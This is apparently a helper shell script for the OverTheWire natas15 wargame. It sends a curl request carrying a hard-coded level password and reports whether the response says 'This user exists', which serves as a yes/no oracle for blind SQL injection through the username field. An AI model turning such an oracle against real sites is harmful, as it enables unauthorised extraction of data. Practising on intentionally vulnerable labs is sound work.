#!/bin/sh
if [[ $2 == *"r"* ]] ; then 
	echo trying $1
fi
result=$( curl -su natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/index.php --data-urlencode username="$1" )
if [[ $result == *"This user exists."* ]] ; then
	echo true
else
	echo false
fi

if [[ $2 == *"p"* ]] ; then
	echo $result
fi
